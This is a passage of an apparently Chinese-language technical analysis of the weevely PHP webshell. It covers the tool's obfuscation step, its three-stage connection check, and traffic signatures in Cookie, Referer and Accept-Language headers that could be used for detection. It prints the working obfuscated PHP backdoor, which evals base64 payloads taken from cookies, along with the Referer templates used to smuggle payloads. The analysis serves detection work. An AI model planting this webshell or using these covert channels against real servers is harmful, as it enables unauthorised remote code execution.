&emsp;2. <code> **minified_agent = utils.code.minify_php(agent)**</code>对原始的webshell进行"净化"操作，去除里面"\n\t"等特殊字符。处理完的源码代码为：<br>

		'$c="count";$a=$_COOKIE;if(reset($a)=="he"&&$c($a)>3){$k="llo";echo"<$k>";eval(base64_decode(preg_replace(array("/[^\\w=\\s]/","/\\s/"),array("","+"),join(array_slice($a,$c($a)-3)))));echo"</$k>";}'
&emsp;3. <code> **obfuscated = obfuscator_template.render(agent=agent)**</code>这是最核心的代码，使用obfuscator模板对webshell进行"模糊处理"，去除容易被检测的特征。生成的源码为<br>

		u'<?php
		$c="count";$a=$_COOKIE;if(reset($a)=="he"&&$c($a)>3){$k="llo";echo"<$k>";eval(base64_decode(preg_replace(array("/[^\\w=\\s]/","/\\s/"),array("","+"),join(array_slice($a,$c($a)-3)))));echo"</$k>";}
		?>'
&emsp;4.通过对php源代码的走读可以看出legacycookie_php.tpl模板执行结果放在"<$k></$k>"标签中，标签中执行结果通过正则表达式匹配，然后进行base64解码获得。

### 6.4&emsp;验证连接是否成功 ###
1. 通过`_check_interpreter()`函数构造随机打印字符的payload，调用channel.py文件中的send()函数中代码` response = self.channel_loaded.send(
                payload,
                self._additional_handlers()
            )`向三种payload加密方式中分别发送payload。依次执行查看响应的Response_body的值是否与构造payload想打印的值相等来进行判断连接是否成功。
2. 第一次payload发送到stegaref.py的send()函数中，payload经过用户输入的连接密码进行加密，构造request请求头发送http协议，执行php后门文件，通过php文件中生成文件的密码进行解密执行payload，得到相应Response。`response = opener.open(url).read()`得到响应体的值。判断：<br>1.&emsp;响应体为空，说明连接密码生成的payload和真实密码解密的payload不一致，验证失败。<br>2.&emsp;响应体不为空，验证成功。
3. 若第一次验证失败，进行第二次验证，payload会发送到legacycookie.py的send()函数中，第二种payload的加密方式主要为base64编码加密然后在加密后的payload中加入特殊字符进行混淆。所以第二种加密方式不需要php文件中的密码进行解密，payload在php文件中进行base64解压缩执行，执行结果在Response_body中用密码第三位至末尾字符串标签进行包装。通过相同代码`response = opener.open(url).read()`获得响应体。判断：<br>1.&emsp;如果响应体为空，说明php文件没有执行，所以可能为连接url错误。<br>2.&emsp;响应体不为空，通过正则表达式` self.extractor = re.compile("<%s>(.*)</%s>" % (self.password[2:],self.password[2:]),re.DOTALL)`和代码` data = self.extractor.findall(response)`进行匹配密码第三位至末尾和响应体中的标签是否一致，如果一致的话则连接密码正确验证成功，如果不一致说明连接密码错误验证不成功。
4. 前两次均失败则调用第三种payload加密方式，向legacyreferrer.py文件中的send()函数发送payload，第三种payload加密方式为构造referer头`referer = "http://www.google.com/url?sa=%s&source=web&ct=7&url=%s&rct=j&q=%s&ei=%s&usg=%s&sig2=%s" % (self.password[:2],urllib2.quote(self.url),self.query.strip(),payload[:third],payload[ third:thirds],payload[thirds:])`但是payload的加密方式依然为base64编码加密，所以密码正确与否的验证机制和第二种相同。

## 7.&emsp;weevely数据特征提取 ##
### 7.1&emsp;stegaref_php.tpl模板特征 ###
1. 上文中已经分析，stegaref_php.tpl模板的数据包的攻击payload主要存储于构造的Referer头中。
2. 通过对<code> **for referrer_index, referrer_vanilla_data in enumerate(itertools.cycle(self.referrers_vanilla)):**</code>这个语句进行debug，可以跟踪到self.referrers_vanilla的所有模板。
3. 跟踪找到referrers.tpl文件在weevely3-master/core/channels/stegaref/路径下，文件中存储，通过stegaref_php.tpl模板构造的Referer头主要有7种形式：<br>

		http://www.google.${ tpl.rand_google_domain() }/url?sa=t&rct=j&q=${ tpl.target_name() }&source=web&cd=${ tpl.rand_number(3) }&ved=${ tpl.payload_chunk(9) }&url=${ tpl.target_name() }&ei=${ tpl.payload_chunk(22) }&usg=${ tpl.payload_chunk(34) }
		http://www.google.${ tpl.rand_google_domain() }/url?sa=t&rct=j&q=${ tpl.target_name() }&source=web&cd=${ tpl.rand_number(3) }&ved=${ tpl.payload_chunk(9) }&url=${ tpl.target_name() }&ei=${ tpl.payload_chunk(22) }&usg=${ tpl.payload_chunk(34) }&sig2=${ tpl.payload_chunk(22) }
		http://translate.googleusercontent.com/translate_c?depth=1&rurl=translate.google.com&sl=auto&tl=en&u=${ tpl.target_name() }&usg=${ tpl.payload_chunk(34) }
		http://${ tpl.get_url_base() }/?${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }&${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }
		http://${ tpl.get_url_base() }/?${ tpl.rand_chars(3) }=${ tpl.payload_chunk(30,20) }
		http://${ tpl.get_url_agent() }?${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }&${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }
		http://${ tpl.get_url_agent() }?${ tpl.rand_chars(3) }=${ tpl.payload_chunk(30,20) }

&emsp;4. 代码中构造的Accept-Language头<code><font color=red>Accept-Language: uk-UA,mi;q=0.5,mt;q=0.7,mk;q=0.8</font></code>其中，q=0.%d 为固定格式，代表着真实payload的偏移量。
### 7.2&emsp;legacycookie_php.tpl模板特征 ###
1. 通过对数据包的抓取，我们可以看到weevely的攻击载荷payload存在于Cookie中，<code><font color=red>Cookie: USR=he; APISID=-Y2\*hka?XI/oJy9-2YXIv; USRID=d3@d3L2h0b-W-wn-K&TtA; SESS=c-3\*lzdGV-tK-C-d3aG9hbWkgMj4mM#Sc\*pO-w==</font></code>
2. 由上文可知，cookie中存储payload的头全部通过从self.default_prefixes数组中获取，所以一定为那9个字符串中的一个。
3. legacycookie_php.tpl模板也可以通过构造referer头。主要特征格式为：<br>

		referer = "http://www.google.com/url?sa=%s&source=web&ct=7&url=%s&rct=j&q=%s&ei=%s&usg=%s&sig2=%s" % (
            self.password[:2],
            urllib2.quote(self.url),
            self.query.strip(),
            payload[:third],
            payload[ third:thirds],
            payload[thirds:]
        )

